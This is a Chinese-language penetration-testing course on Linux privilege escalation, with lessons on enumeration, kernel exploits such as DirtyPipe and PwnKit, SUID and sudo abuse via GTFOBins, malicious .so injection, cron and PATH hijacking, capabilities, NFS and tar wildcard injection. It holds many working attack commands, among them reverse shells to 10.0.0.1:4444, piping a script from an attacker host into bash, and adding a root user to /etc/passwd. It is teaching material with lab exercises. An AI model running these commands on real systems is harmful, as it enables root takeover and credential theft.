# Linux 提权详解 —— 内核漏洞 / SUID / sudo / Cron / 能力 / 容器逃逸
## 整体学习路径
![](https://cdn.nlark.com/yuque/__mermaid_v3/3f0f2f875771f23e6111482d7fbdc79e.svg)

---

# 第 1 课 提权概论 + 系统枚举
> 时长 60 分钟。建立"提权"概念模型，掌握系统枚举方法论。

## 1.1 什么是提权
### 1.1.1 定义
**提权（Privilege Escalation）**：在已经获得目标系统低权限账户后，通过各种技术手段**提升到更高权限**（通常是 root）的过程。

```plain
渗透流程：
Web shell / 反弹 shell
        ↓
   www-data / nobody (低权)
        ↓
        ↓  ← 这里就是"提权"
        ↓
   root 权限 (高权)
        ↓
   持久化 / 内网横向
```

### 1.1.2 为什么要提权
低权限账户能做的事有限：

```plain
┌─────────────────────────────────────────────────┐
│ www-data 能做的：                                │
│ - 读自己有权限的文件                             │
│ - 执行部分命令                                   │
│ - 不能改系统配置                                 │
│ - 不能读其他用户的私有文件                       │
│ - 不能装软件                                     │
│ - 不能看其他进程                                 │
│                                                  │
│ root 能做的：                                    │
│ - 一切                                           │
│ - 读任意文件（含 /etc/shadow）                   │
│ - 改密码、加用户                                 │
│ - 改防火墙、装软件                               │
│ - 抓密码 hash                                    │
│ - 持久化、清痕迹、横向移动                       │
└─────────────────────────────────────────────────┘
```

### 1.1.3 提权的两大方向
| 类型 | 含义 | 例子 |
| --- | --- | --- |
| 水平提权 | 普通用户 → 同级另一普通用户 | user1 → user2（拿 user2 私钥） |
| 垂直提权 | 普通用户 → root | www-data → root |


本课重点讲**垂直提权**（业内俗称"提权"）。

## 1.2 Linux 权限模型复习
### 1.2.1 UID / GID
每个用户有：

+ **UID**（User ID）：用户标识
    - `0` = root
    - `1-999` = 系统用户（www-data / nobody / mysql）
    - `1000+` = 普通用户
+ **GID**（Group ID）：主组标识

```bash
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

cat /etc/passwd | grep www-data
# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
# 用户名:密码占位:UID:GID:注释:家目录:Shell
```

### 1.2.2 文件权限
```plain
-rwsr-xr-x  1 root root  44440 Mar 14 10:00 /usr/bin/passwd
├─┤├─┤├─┤
 │  │  └─ other: --x
 │  └──── group: r-x
 └─────── owner: rws
            ↑ s 是 SUID（关键！）
```

权限位：

```plain
r = 4 = 读
w = 2 = 写
x = 1 = 执行
s = SUID（owner 位）/ SGID（group 位）
t = Sticky（other 位，仅 owner 能删）
```

### 1.2.3 特殊权限位
| 位 | 含义 | 例子 |
| --- | --- | --- |
| **SUID** | 执行时以**文件 owner**身份运行 | `/usr/bin/passwd`（owner=root） |
| **SGID** | 执行时以**文件 group**身份运行 | 部分共享目录 |
| **Sticky** | 目录下文件仅 owner 可删 | `/tmp` |


SUID 是 Linux 提权的**最大攻击面**之一，第 2 课详细讲。

### 1.2.4 关键文件
```plain
/etc/passwd       所有用户信息（含 UID/GID/Shell）
/etc/shadow       密码 hash（仅 root 可读）
/etc/sudoers      sudo 配置（仅 root 可读）
/etc/group        用户组
/etc/crontab      系统级 cron
/var/spool/cron/  用户级 cron
/home/*/.ssh/     SSH 私钥
/home/*/.bash_history   bash 历史
~/.aws/credentials      AWS 凭据
```

## 1.3 提权方法论
### 1.3.1 提权四步法
```plain
┌─────────────────────────────────────────────┐
│ 1. 枚举 (Enumeration)                       │
│    系统信息 / 用户 / 服务 / 配置              │
│                  ↓                           │
│ 2. 分析 (Analysis)                           │
│    找出可能的提权路径                         │
│                  ↓                           │
│ 3. 利用 (Exploitation)                       │
│    执行提权 exploit / 利用配置缺陷            │
│                  ↓                           │
│ 4. 验证 (Verification)                       │
│    id / whoami 确认是 root                   │
└─────────────────────────────────────────────┘
```

### 1.3.2 提权思路总图
```plain
┌────────────────────────────────────────────────┐
│ 1. 内核漏洞（DirtyCow / DirtyPipe / OverlayFS）│
│ 2. SUID 滥用（GTFOBins）                       │
│ 3. sudo 配置错误                               │
│ 4. Cron 任务滥用                              │
│ 5. PATH 劫持                                   │
│ 6. Capabilities 滥用                          │
│ 7. NFS no_root_squash                         │
│ 8. 通配符注入（Tar）                          │
│ 9. 配置文件泄露密码                            │
│ 10. 容器逃逸（Docker / K8s）                  │
│ 11. 第三方服务漏洞（数据库、Redis 等）          │
│ 12. 弱口令爆破（root / 其他用户）              │
└────────────────────────────────────────────────┘
```

## 1.4 系统信息枚举
### 1.4.1 内核版本
```bash
uname -a
# Linux victim 5.4.0-80-generic #90-Ubuntu SMP Fri Jul 9 22:49:44 UTC 2021 x86_64 GNU/Linux

cat /proc/version
# Linux version 5.4.0-80-generic ...

lsb_release -a
# Distributor ID: Ubuntu
# Description:    Ubuntu 20.04.2 LTS
# Release:        20.04
# Codename:       focal

cat /etc/os-release
```

### 1.4.2 为什么内核版本重要
内核漏洞 EXP 是**版本特定**的：

```plain
Ubuntu 16.04 + 内核 4.4.0 → DirtyCow (CVE-2016-5195) 适用
Ubuntu 20.04 + 内核 5.4.0 → DirtyPipe (CVE-2022-0847) 适用
CentOS 7   + 内核 3.10.0  → CVE-2017-1000112 适用
```

### 1.4.3 架构
```bash
arch        # x86_64 / i386 / arm64
uname -m    # 同上
```

决定了 EXP 编译版本。

### 1.4.4 系统运行情况
```bash
# 运行时间
uptime

# 进程
ps aux
ps -ef
ps -ef --forest

# 网络连接
ss -tulnp
netstat -tulnp

# 挂载
mount
df -h

# 环境变量
env
echo $PATH

# 已安装软件（dpkg / rpm）
dpkg -l       # Debian 系
rpm -qa       # RedHat 系
```

## 1.5 用户信息枚举
### 1.5.1 当前用户
```bash
whoami       # 当前用户
id           # UID / GID / 附加组
who          # 谁登录了
w            # 谁登录了 + 在做什么
last         # 历史登录
```

### 1.5.2 其他用户
```bash
cat /etc/passwd | grep /bin/bash    # 看有 shell 的用户
cat /etc/passwd | cut -d: -f1       # 所有用户名

# 检查特权组
cat /etc/group | grep -E "sudo|wheel|docker|admin|shadow"
# docker 组 → 可以直接提权（后面讲）
# shadow 组 → 可读 /etc/shadow 拿密码 hash
# sudo 组 → 可执行 sudo
```

### 1.5.3 sudo 权限
```bash
sudo -l
# 可能输出：
# User user1 may run the following commands on this host:
#     (ALL) NOPASSWD: /usr/bin/find
# → 可以无密码 sudo 执行 find，可利用 GTFOBins 提权！
```

### 1.5.4 SSH 密钥
```bash
# 查找所有 SSH 私钥
find / -name id_rsa -o -name id_ecdsa -o -name id_ed25519 2>/dev/null
find / -name "*.pem" 2>/dev/null

# 检查 .ssh 目录
ls -la /home/*/.ssh/
ls -la /root/.ssh/ 2>/dev/null    # 通常不可读
```

### 1.5.5 配置文件中的密码
```bash
# 数据库配置
find / -name "wp-config.php" 2>/dev/null    # WordPress
find / -name "config.php" 2>/dev/null
find / -name "database.yml" 2>/dev/null     # Rails
find / -name "application.properties" 2>/dev/null  # Spring

# history 文件
cat /home/*/.bash_history
cat /root/.bash_history 2>/dev/null
cat /home/*/.mysql_history
cat /home/*/.psql_history

# 配置文件含 password 关键字
grep -rE "password|passwd|pwd" /etc/ 2>/dev/null | grep -v "^Binary"
grep -rE "password|passwd|pwd" /opt/ 2>/dev/null
grep -rE "password|passwd|pwd" /var/www/ 2>/dev/null
```

## 1.6 LinPEAS / LinEnum 自动化
### 1.6.1 为什么需要自动化
手工枚举容易漏，每个提权点要查上百个位置。自动化工具一键扫光。

### 1.6.2 LinPEAS（推荐）
**LinPEAS**（Linux Privilege Escalation Awesome Script）：彩色输出、覆盖最全。

```bash
# 在攻击机上准备
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# 传到目标（HTTP）
python3 -m http.server 8080
# 目标执行：
curl http://attacker:8080/linpeas.sh | bash

# 或者先下载再执行
wget http://attacker:8080/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh > /tmp/linpeas.txt
```

输出中**红色高亮**的项是关键风险点。

### 1.6.3 LinEnum
```bash
git clone https://github.com/rebootuser/LinEnum
cd LinEnum
./LinEnum.sh -t
```

### 1.6.4 linux-exploit-suggester
专门找内核漏洞：

```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

输出会列出该内核版本可能受影响的 CVE，从高到低排序。

### 1.6.5 pspy（监控无 root 进程）
监控 cron 等后台进程：

```bash
wget https://github.com/dominicbreuker/pspy/releases/.../pspy64
chmod +x pspy64
./pspy64
```

可以观察到 root 跑的 cron 任务，发现提权路径。

---

## 第 1 课小结
| 模块 | 命令 |
| --- | --- |
| 系统信息 | `uname -a` / `cat /etc/os-release` |
| 用户信息 | `id` / `cat /etc/passwd` |
| sudo | `sudo -l` |
| 进程 | `ps aux` |
| 自动化 | LinPEAS / LinEnum / pspy |


## 课间实操 1（15 分钟）
启动一台 Linux 靶机（VulnHub 任意 / Kali 虚拟机 / Ubuntu 20.04）。执行：

1. `uname -a` / `id` / `cat /etc/passwd | grep bash`
2. `sudo -l`（输入当前用户密码）
3. 下载 LinPEAS，跑一遍，截图红色高亮项
4. 用 `pspy64` 观察后台进程，找找有没有 root 跑的脚本

---

# 第 2 课 内核漏洞 + SUID/SGID
> 时长 60 分钟。内核漏洞是"核武器"，SUID 是"日常工具"。
>

## 2.1 内核漏洞提权原理
### 2.1.1 内核 vs 用户态
```plain
┌─────────────────────────────────────┐
│ 用户态 (User Space)                 │
│   - 普通进程                         │
│   - 无硬件访问权限                   │
│   - 通过 syscall 调用内核            │
└────────────┬────────────────────────┘
             │ syscall
             ▼
┌─────────────────────────────────────┐
│ 内核态 (Kernel Space)                │
│   - 内核（ring 0）                   │
│   - 完全控制硬件                     │
│   - 所有进程共享                     │
└─────────────────────────────────────┘
```

内核漏洞 = 让普通进程通过特定 syscall 触发内核 bug，执行任意代码（在内核态），从而获得 root。

### 2.1.2 内核漏洞特点
```plain
┌──────────────────────────────────────────┐
│ 1. 版本特定（精确到小版本号）            │
│ 2. 利用通常很复杂（涉及内存破坏）        │
│ 3. 失败可能导致系统崩溃（DoS）           │
│ 4. 但是一旦成功 = 直接 root              │
└──────────────────────────────────────────┘
```

## 2.2 经典 DirtyCow / DirtyPipe
### 2.2.1 DirtyCow（CVE-2016-5195）
**CVE-2016-5195 Dirty COW（脏牛）**：Linux 内核 race condition，可读改任意只读文件。

+ 影响范围：Linux 2.6.22 - 4.8.3（2007 - 2016，影响 9 年！）
+ 利用：覆盖 `/etc/passwd`，给当前用户加 root UID
+ 公开 EXP：[Dirty COW 官方 PoC](https://github.com/dirtycow/dirtycow.github.io)

```bash
gcc dirtyc0w.c -o dirtyc0w -pthread -lcrypt
./dirtyc0w
# 然后用 firefart 用户登录（密码也是 firefart），就是 root
```

### 2.2.2 DirtyPipe（CVE-2022-0847）
**CVE-2022-0847 Dirty Pipe**：pipe 缓冲区未初始化，可写任意只读文件。

+ 影响范围：Linux 5.8 - 5.16.10 / 5.15.24 / 5.10.101
+ 利用：覆盖 `/etc/passwd` 或覆盖 SUID 二进制
+ 公开 EXP：[https://github.com/blasty/CVE-2022-0847](https://github.com/blasty/CVE-2022-0847)

```bash
gcc dirty_pipe.c -o dirty_pipe
./dirty_pipe /etc/passwd 1 "${hash}"
su root   # 用注入的 root 账户
```

### 2.2.3 其他经典内核漏洞
| CVE | 名称 | 影响版本 |
| --- | --- | --- |
| CVE-2016-5195 | DirtyCow | 2.6.22 - 4.8.3 |
| CVE-2022-0847 | DirtyPipe | 5.8 - 5.16.10 |
| CVE-2017-1000112 | UAF SMEP | < 4.13 |
| CVE-2017-7308 | AF_PACKET | < 4.10.7 |
| CVE-2019-13272 | ptrace | 4.x |
| CVE-2016-8655 | AF_PACKET race | < 4.4.2 |
| CVE-2021-22555 | Netfilter | < 5.12 |
| CVE-2021-4034 | PwnKit (polkit) | 几乎所有 Linux |


### 2.2.4 PwnKit（CVE-2021-4034）
**特别推荐**：CVE-2021-4034 PwnKit，影响**几乎所有 Linux 发行版 12 年**，利用简单成功率极高：

```bash
git clone https://github.com/berdav/CVE-2021-4034
cd CVE-2021-4034
make
./cve-2021-4034
# 直接 root shell
```

## 2.3 搜索 EXP 的方法
### 2.3.1 searchsploit
```bash
# 安装 ExploitDB 离线库
apt install exploitdb

# 搜索
searchsploit linux kernel 4.4.0
searchsploit dirty cow
searchsploit "Ubuntu 20.04"
```

### 2.3.2 在线资源
```plain
https://www.exploit-db.com           ExploitDB
https://github.com/xairy/linux-kernel-exploitation  内核 EXP 集合
https://github.com/danielmiessler/SecLists/blob/master/Exploits/
https://github.com/lucyoa/kernel-exploits
https://github.com/SecWiki/linux-kernel-exploits  (中文)
```

### 2.3.3 linux-exploit-suggester
```bash
./linux-exploit-suggester.sh
# 自动根据内核版本列出可能 EXP
```

### 2.3.4 利用注意事项
```plain
┌────────────────────────────────────────┐
│ 1. EXP 必须匹配内核精确版本             │
│ 2. 先在虚拟机里测试再上生产             │
│ 3. 部分 EXP 会导致系统崩溃（kernel panic） │
│ 4. 没网络时可手工编译                   │
│ 5. 静态编译更稳（不依赖目标 libc）       │
└────────────────────────────────────────┘
```

静态编译：

```bash
# 在攻击机
musl-gcc -static dirty_pipe.c -o dirty_pipe_static
file dirty_pipe_static
# ELF 64-bit LSB executable, x86-64, statically linked
```

## 2.4 SUID/SGID 原理
### 2.4.1 SUID 详细解释
SUID（Set-owner User ID）：当一个二进制文件设置了 SUID，**任何用户执行该文件时都以 owner 的身份运行**。

最经典例子：`/usr/bin/passwd`

```bash
ls -l /usr/bin/passwd
# -rwsr-xr-x 1 root root 59640 Mar 22 20:02 /usr/bin/passwd
#       ↑ s = SUID
```

 passwd 程序的 owner 是 root，但任何用户都要用 passwd 改自己的密码，而密码 hash 在 `/etc/shadow`（root 才能读写）。所以 passwd 必须以 root 身份运行。

### 2.4.2 SUID 的安全风险
```plain
如果某个 SUID 二进制 = root 所有 + 有功能漏洞
    ↓
攻击者利用漏洞 = 以 root 身份执行任意命令
    ↓
提权成功
```

### 2.4.3 查找 SUID 文件
```bash
# 找所有 SUID 文件
find / -perm -4000 -type f 2>/dev/null

# 找所有 SGID 文件
find / -perm -2000 -type f 2>/dev/null

# 两者都找
find / \( -perm -4000 -o -perm -2000 \) -type f -exec ls -la {} \; 2>/dev/null

# 简化版
find / -perm -u=s -type f 2>/dev/null
```

输出示例：

```plain
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/su
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/exim   ← 这个不是默认的！
/home/user1/backup   ← 这个也不是！可能后门
```

**关注点**：找非默认的、自定义的 SUID 文件。

## 2.5 SUID 提权
### 2.5.1 GTFOBins
**GTFOBins**（[https://gtfobins.github.io）：列出](https://gtfobins.github.io）：列出) Unix 二进制的"非预期用法"，包括 SUID 提权、sudo 提权等。

例如搜 `find`：

```plain
SUID:
sudo install -m =xs $(which find) .
./find . -exec /bin/sh -p \; -quit
```

### 2.5.2 经典 SUID 提权二进制
#### find
```bash
find . -exec /bin/sh -p \; -quit
# 直接拿到 root shell
```

#### vim
```bash
vim -c ':!/bin/sh'
# 或交互式
vim
:py3 import os; os.execl('/bin/sh', 'sh', '-c', 'sh; sh')
```

#### nmap（老版本，有 interactive mode）
```bash
nmap --interactive
nmap> !sh
```

#### less / more
```bash
less /etc/shadow
# 在 less 里输入
!/bin/sh
```

#### cp / mv
利用 cp/mv 覆盖 `/etc/passwd` 或 `/etc/shadow`。

```bash
# 生成密码 hash
openssl passwd -1 -salt abc password123
# $1$abc$xxxxx...

# 加一行 root 用户
echo 'hacker:$1$abc$xxx:0:0::/root:/bin/bash' >> /etc/passwd
```

#### bash
```bash
bash -p
# -p = 不重置 effective UID
```

#### env / python / perl / ruby
```bash
env /bin/sh
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
perl -e 'exec "/bin/sh"'
ruby -e 'exec "/bin/sh"'
```

#### awk
```bash
awk 'BEGIN {system("/bin/sh")}'
```

#### curl（间接）
```bash
# 攻击机准备 LFI 文件，目标用 curl 读
curl http://attacker/shadow > /tmp/shadow_exfil
```

### 2.5.3 自定义 SUID 程序利用
如果发现 `/home/user/backup` 是自定义 SUID root 程序，分析它：

```bash
# 1. 看类型
file /home/user/backup

# 2. strings 找关键字
strings /home/user/backup | grep -E "sh|system|exec"

# 3. ltrace / strace（如果可执行）
strace /home/user/backup 2>&1 | grep -E "exec|open"

# 4. 反编译（ghidra / IDA）
```

常见漏洞：

+ 调用 system() 拼接用户输入 → 命令注入
+ 调用 execve() 路径相对 → PATH 劫持（第 3 课）
+ 调用 popen() 调用其他命令 → 同上

## 2.6 共享库注入
### 2.6.1 LD_PRELOAD
如果一个 SUID 程序加载了共享库，可以注入恶意 .so 劫持函数。

但 SUID 程序通常会忽略 LD_PRELOAD（glibc 安全机制），所以这种攻击主要针对 sudo 启动的程序。

```bash
# /etc/sudoers:
# user1 ALL=(ALL) NOPASSWD: env_keep=LD_PRELOAD /usr/bin/find

# 攻击
cat > /tmp/shell.c <<EOF
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
void _init() {
    setuid(0);
    setgid(0);
    system("/bin/sh");
}
EOF
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so find
```

### 2.6.2 rpath
某些二进制自带 rpath（运行时库搜索路径）。如果该路径可写，可注入恶意 .so。

```bash
readelf -d /usr/local/bin/suid_program | grep RPATH
# 如果 RPATH 指向 /tmp/libs/ 且该目录 user 可写

# 注入
echo 'void __attribute__((constructor)) _init(){system("/bin/sh");}' > /tmp/evil.c
gcc -shared -fPIC -o /tmp/libs/evil.so /tmp/evil.c
/usr/local/bin/suid_program   # 触发
```

---

## 第 2 课小结
| 模块 | 关键点 |
| --- | --- |
| 内核漏洞 | 版本特定，linux-exploit-suggester 找 EXP |
| DirtyCow | 2007-2016 年影响 |
| DirtyPipe | 5.8 - 5.16.10 |
| PwnKit | 2021-4034，几乎所有 Linux |
| SUID 查找 | `find / -perm -4000` |
| GTFOBins | SUID/sudo 利用大全 |
| 自定义 SUID | strings + strace + 反编译 |


## 课间实操 2（20 分钟）
1. 启动 VulnHub 的 Kioptrix Level 1（或任何 VulnHub 1.0 系列靶机）。
2. 用 nmap / web 漏洞获得低权限 shell。
3. 执行 `find / -perm -4000 -type f 2>/dev/null`，找出所有 SUID。
4. 查 GTFOBins，看哪些可以提权。
5. 用 `linux-exploit-suggester.sh` 找内核 EXP，尝试 PwnKit。

---

# 第 3 课 sudo / Cron / PATH / Capabilities
> 时长 60 分钟。本课是日常渗透中**最常用**的提权方法。
>

## 3.1 sudo 配置与漏洞
### 3.1.1 sudo 原理
`sudo`（superuser do）：允许普通用户以其他用户身份（默认 root）执行命令，前提是 `/etc/sudoers` 授权。

```bash
# 查看自己的 sudo 权限
sudo -l

# 示例输出 1（无限制）
User user1 may run the following commands on this host:
    (ALL : ALL) ALL
# 完全提权：sudo su -

# 示例输出 2（仅部分命令）
User user1 may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/find
# 只能 sudo find，但 find 可被 GTFOBins 提权

# 示例输出 3（含通配）
User user1 may run the following commands on this host:
    (root) NOPASSWD: /bin/cp /tmp/* /etc/cron.d/
# 可往 cron 目录复制任意文件
```

### 3.1.2 sudoers 配置文件
```bash
cat /etc/sudoers
# 语法：
# 用户  主机=(运行身份) [NOPASSWD:] 命令

# 示例
root         ALL=(ALL:ALL) ALL
%admin       ALL=(ALL) ALL
%sudo        ALL=(ALL:ALL) ALL
user1        ALL=(root) NOPASSWD: /usr/bin/find

# include
#includedir /etc/sudoers.d
```

`/etc/sudoers.d/` 目录下文件也会被加载。

### 3.1.3 经典 sudo 提权 —— GTFOBins
任何能"执行任意命令"的二进制，sudo 它就 = root。

```bash
# find
sudo find . -exec /bin/sh \; -quit

# vim
sudo vim -c ':!/bin/sh'

# awk
sudo awk 'BEGIN {system("/bin/sh")}'

# less
sudo less /etc/anything
# !sh

# man
sudo man man
# !sh

# tar
sudo tar cf /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# python
sudo python -c 'import os; os.system("/bin/sh")'

# perl
sudo perl -e 'exec "/bin/sh"'

# ruby
sudo ruby -e 'exec "/bin/sh"'

# env
sudo env /bin/sh

# cp
sudo cp /etc/passwd /tmp/; ... 修改 ...; sudo cp /tmp/passwd /etc/passwd

# wget
# 用 wget 的 --input-file 读任意文件
sudo wget --input-file=/etc/shadow
```

### 3.1.4 sudo 历史漏洞
#### CVE-2019-14287
如果 sudoers 配置 `(ALL, !root)` 意图"禁止 root"，但用 `sudo -u "#-1"` 绕过：

```bash
sudo -u "#-1" /bin/sh
# 直接 root
```

#### CVE-2019-18634
`sudo < 1.8.26` 的 `pwfeedback` 选项存在栈溢出：

```bash
sudo -S -l
# 输入超长密码触发
```

#### CVE-2021-3156 Baron Samedit
`sudo < 1.9.5p2` 命令行参数堆溢出：

```bash
git clone https://github.com/blasty/CVE-2021-3156
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich <id>
```

影响 10 年内的几乎所有 sudo 版本，**无需 sudo 权限**就能提权。

### 3.1.5 sudo 提权流程
```plain
1. sudo -l 看能执行什么
2. 如果是 GTFOBins 列出的二进制 → 直接提权
3. 如果是脚本/自定义程序 → 分析漏洞
4. 如果 sudo 版本旧 → 尝试历史 CVE
```

## 3.2 Cron 定时任务滥用
### 3.2.1 Cron 原理
**Cron**：Linux 定时任务调度，按时间规则执行命令。

```bash
# 系统级 cron
cat /etc/crontab

# 用户级 cron
ls /var/spool/cron/crontabs/
cat /var/spool/cron/crontabs/*     # 通常不可读

# anacron（每日/每周执行）
cat /etc/anacrontab
```

示例 `/etc/crontab`：

```plain
# m h dom mon dow user  command
*/5 * * * * root  /opt/backup.sh
0  3 * * * root  /usr/local/bin/cleanup.sh
30 4 * * 7 root  tar -zcf /var/backups/home.tgz /home/
```

每 5 分钟以 root 身份执行 `/opt/backup.sh`。

### 3.2.2 Cron 提权思路
```plain
┌──────────────────────────────────────────────┐
│ 1. 脚本本身可写 → 改成反弹 shell              │
│ 2. 脚本调用的命令路径可写 → PATH 劫持         │
│ 3. 脚本调用通配符 → 通配符注入                │
│ 4. 脚本目录可写 → 替换脚本                    │
└──────────────────────────────────────────────┘
```

### 3.2.3 案例 1：脚本可写
```bash
ls -la /opt/backup.sh
# -rwxrwxrwx 1 root root ... /opt/backup.sh
# ↑ other 可写！

echo '#!/bin/bash' > /opt/backup.sh
echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> /opt/backup.sh
# 等下一次 cron 执行（5 分钟内）就拿到 root shell
```

### 3.2.4 案例 2：PATH 劫持
```bash
# 假设 /etc/crontab 中有：
# */5 * * * * root backup_data

# backup_data 内容：
# #!/bin/bash
# tar -czf /backup/$(date +%F).tar.gz /var/www
# ↑ 用的是 tar，没绝对路径

# 检查 PATH
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin

# 攻击：在可写目录放一个 tar 后门
mkdir /tmp/pwn
cat > /tmp/pwn/tar <<EOF
#!/bin/bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
EOF
chmod +x /tmp/pwn/tar

# 但 cron 的 PATH 是固定的，无法控制
# 除非 cron 任务里 export PATH，否则 PATH 劫持在 cron 场景有限
```

更准确的 PATH 劫持场景见 3.3 节。

### 3.2.5 用 pspy 找隐藏 cron
很多 cron 任务不在 `/etc/crontab` 而在 systemd timer 或脚本里。pspy 可以监控：

```bash
./pspy64
# 实时显示：
# 2024/01/01 12:00:00 CMD: UID=0  PID=1234  | /bin/sh -c /opt/backup.sh
```

发现 cron 后再去检查脚本是否有漏洞。

## 3.3 PATH 环境变量劫持
### 3.3.1 PATH 原理
PATH 环境变量决定 shell 在哪里找命令：

```bash
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# 当你输入 ls，shell 会依次查找：
# /usr/local/sbin/ls (不存在)
# /usr/local/bin/ls (不存在)
# /usr/sbin/ls (不存在)
# /usr/bin/ls (存在) ← 执行这个
```

### 3.3.2 PATH 劫持原理
如果 SUID root 程序内部用 `system("ps")` 这样的相对路径调用，会按当前用户的 PATH 查找。

**攻击**：

```bash
# 准备
echo $PATH
# /usr/local/bin:...

# 自定义一个恶意 ps
echo '/bin/sh' > /tmp/ps
chmod +x /tmp/ps

# 把 /tmp 加到 PATH 最前面
export PATH=/tmp:$PATH

# 执行 SUID 程序
./suid_program
# 程序内部 system("ps") → 找 /tmp/ps → 执行 /bin/sh
# 由于程序是 SUID root，shell 是 root 的
```

### 3.3.3 PATH 劫持实战步骤
```bash
# 1. 找 SUID 程序
find / -perm -4000 -type f 2>/dev/null
# 假设发现 /usr/local/bin/suid_binary

# 2. 分析它调用的命令（用 strings）
strings /usr/local/bin/suid_binary | grep -E "^[a-z]+$"
# ps
# netstat
# whoami

# 3. 用 strace 确认（如果有权限）
strace -f /usr/local/bin/suid_binary 2>&1 | grep execve

# 4. 写一个同名后门
echo '/bin/bash -p' > /tmp/ps
chmod +x /tmp/ps

# 5. PATH 注入
export PATH=/tmp:$PATH

# 6. 执行
/usr/local/bin/suid_binary
```

## 3.4 Linux Capabilities 提权
### 3.4.1 Capabilities 是什么
传统 Linux 只有 root / 非 root 二分权限。**Capabilities** 把 root 权限拆成 40+ 个细分能力：

```plain
CAP_NET_RAW       使用原始套接字（ping、抓包）
CAP_NET_BIND_SERVICE  绑定 <1024 端口
CAP_SYS_ADMIN     系统管理（mount、chroot）
CAP_SYS_PTRACE    调试其他进程
CAP_DAC_OVERRIDE  绕过文件权限检查
CAP_SETUID        改 UID
CAP_KILL          发信号
...
```

### 3.4.2 查看文件的 capabilities
```bash
getcap -r / 2>/dev/null
# 输出：
# /usr/bin/python3.8 = cap_setuid+ep
# /usr/bin/ping = cap_net_raw+ep

# +ep 表示在 effective 和 permitted 集合中
```

### 3.4.3 Capabilities 提权案例
#### cap_setuid
```bash
# /usr/bin/python3.8 cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# 直接 root shell
```

#### cap_sys_admin
可以 mount / chroot / 加载内核模块等。

```bash
# 挂载磁盘读 /etc
mount /dev/sda1 /mnt
cat /mnt/etc/shadow
```

#### cap_dac_read_search
绕过文件读权限：

```bash
# 直接读 /etc/shadow
cat /etc/shadow
```

### 3.4.4 Capabilities 提权清单
参考 GTFOBins 的 capabilities 章节。常用：

```plain
cap_setuid       → 改 UID，python/perl 一行提权
cap_sys_admin    → mount / chroot
cap_dac_read_search → 任意文件读
cap_net_raw      → 抓包 / ARP 欺骗
cap_sys_ptrace   → 注入其他进程
```

## 3.5 NFS no_root_squash
### 3.5.1 NFS 简介
**NFS**（Network File System）：Linux 网络文件系统，把远程目录挂载到本地。

```bash
cat /etc/exports
# 输出：
# /shared  *(rw,sync,no_root_squash)
```

### 3.5.2 no_root_squash 漏洞
**no_root_squash**：客户端以 root 身份访问 NFS 时，服务端**不**把 root 降级为匿名用户（默认会降级，叫 root_squash）。

**攻击流程**：

```bash
# 1. 攻击机（root）挂载 NFS
mkdir /tmp/nfs
mount target:/shared /tmp/nfs

# 2. 在挂载目录里复制一个 SUID bash
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash
# 由于 no_root_squash，SUID 在服务端也生效

# 3. 在目标机（低权限）执行
/shared/bash -p
# -p 不重置 effective UID
# 由于 SUID root，直接 root shell
```

## 3.6 通配符注入
### 3.6.1 原理
shell 通配符 `*` 展开时，会把当前目录文件名作为参数传给命令。如果文件名以 `-` 开头，会被当成命令行选项。

```bash
# 假设 cron 任务是：
# */5 * * * * root tar -czf /backup.tgz /var/www/*

# /var/www/ 下创建：
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' > shell.sh

# 下次 cron 执行：
# tar -czf /backup.tgz /var/www/--checkpoint=1 /var/www/--checkpoint-action=... /var/www/shell.sh ...
# 实际命令变成：
# tar -czf /backup.tgz --checkpoint=1 --checkpoint-action=exec=sh shell.sh ...
# → 触发 RCE
```

### 3.6.2 适合通配符注入的命令
```plain
tar     --checkpoint-action
chmod   --reference
chown   --reference
wget    --input-file
curl    -K
rsync   -e
find    -exec
```

### 3.6.3 chmod --reference 注入
```bash
# 假设 cron: */5 * * * * root chmod 600 /var/www/*.log

touch -- "--reference=/etc/shadow"
# 下次执行：chmod 600 /var/www/*.log /var/www/--reference=/etc/shadow
# → chmod 把 /etc/shadow 改成 600 模式（仍然 root 可读，但攻击者配合别的方法可读）
```

更危险的是 `--reference=attacker_file`，把任意文件权限改成与 attacker_file 相同。

---

## 第 3 课小结
| 模块 | 关键点 |
| --- | --- |
| sudo | sudo -l + GTFOBins |
| sudo CVE | 2019-14287 / 2019-18634 / 2021-3156 |
| Cron | 找可写脚本 / PATH 劫持 / 通配符注入 |
| PATH 劫持 | export PATH=/tmp:$PATH |
| Capabilities | getcap -r / 2>/dev/null |
| NFS | no_root_squash + SUID bash |
| 通配符 | tar --checkpoint-action |


## 课间实操 3（20 分钟）
1. 启动一台 Ubuntu 20.04 虚拟机，创建测试账号。
2. 配置一个故意的 sudo 提权点：

```bash
# 编辑 /etc/sudoers.d/test
echo "test ALL=(root) NOPASSWD: /usr/bin/find" > /etc/sudoers.d/test
visudo -c   # 检查语法
```

3. 切换到 test 用户，用 sudo + GTFOBins 提权到 root。
4. 给 `/usr/bin/python3` 加 cap_setuid，再次提权：

```bash
